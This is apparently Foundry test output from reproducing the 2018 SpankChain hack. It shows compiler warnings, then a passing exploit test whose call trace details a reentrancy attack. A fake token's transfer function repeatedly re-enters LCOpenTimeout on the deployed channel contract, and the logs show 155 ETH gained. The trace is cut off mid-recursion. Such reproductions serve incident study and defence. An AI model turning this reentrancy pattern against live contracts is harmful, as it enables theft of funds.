Compiling 27 files with Solc 0.8.25
Solc 0.8.25 finished in 1.10s
Compiler run successful with warnings:
Warning (3628): This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.
  --> src/test/2018-10/SpankChain_exp.sol:42:1:
   |
42 | contract SpankChainExploit is BaseTestWithBalanceLog {
   | ^ (Relevant source part starts here and spans across multiple lines).
Note: The payable fallback function is defined here.
  --> src/test/2018-10/SpankChain_exp.sol:59:5:
   |
59 |     fallback() payable external {}
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (3628): This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.
  --> src/test/2018-10/SpankChain_exp.sol:62:1:
   |
62 | contract SpankChainExploitHelper {
   | ^ (Relevant source part starts here and spans across multiple lines).
Note: The payable fallback function is defined here.
  --> src/test/2018-10/SpankChain_exp.sol:93:5:
   |
93 |     fallback() payable external {}
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (2018): Function state mutability can be restricted to pure
  --> src/test/2018-10/SpankChain_exp.sol:89:5:
   |
89 |     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool){
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    тФЬтФА [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 307.21ms (741.38┬╡s CPU time)

Ran 1 test for src/test/2018-10/SpankChain_exp.sol:SpankChainExploit
[PASS] testExploit() (gas: 941393)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 155.000000000000000000

Traces:
  [1100593] SpankChainExploit::testExploit()
    тФЬтФА [0] VM::deal(SpankChainExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    тФЬтФА [0] VM::deal(SpankChainExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5000000000000000000 [5e18])
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА [260899] тЖТ new SpankChainExploitHelper@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    тФВ   тФФтФА тЖР [Return] 1082 bytes of code
    тФЬтФА [770108] SpankChainExploitHelper::exploit{value: 5000000000000000000}(32)
    тФВ   тФЬтФА [187541] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::createChannel{value: 5000000000000000000}(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45, SpankChainExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007911590767176 [1.157e77], SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [5000000000000000000 [5e18], 1])
    тФВ   тФВ   тФЬтФА [456] SpankChainExploitHelper::transferFrom(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7, 1)
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА emit DidLCOpen(channelId: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45, partyA: SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], partyI: SpankChainExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ethBalanceA: 5000000000000000000 [5e18], token: SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenBalanceA: 1, LCopenTimeout: 0)
    тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФЬтФА [542518] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФЬтФА [525585] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФЬтФА [524194] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [509261] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [507870] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [492937] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [491546] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [476613] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [475222] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [460289] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [458898] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [443965] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [442574] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [427641] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [426250] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [411317] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [409926] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [394993] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [393602] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [378669] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [377278] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [362345] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [360954] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [346021] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [344630] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [329697] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [328306] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [313373] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [311982] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [297049] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [295658] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [280725] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [279334] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [264401] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [263010] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [248077] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [246686] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [231753] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [230362] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
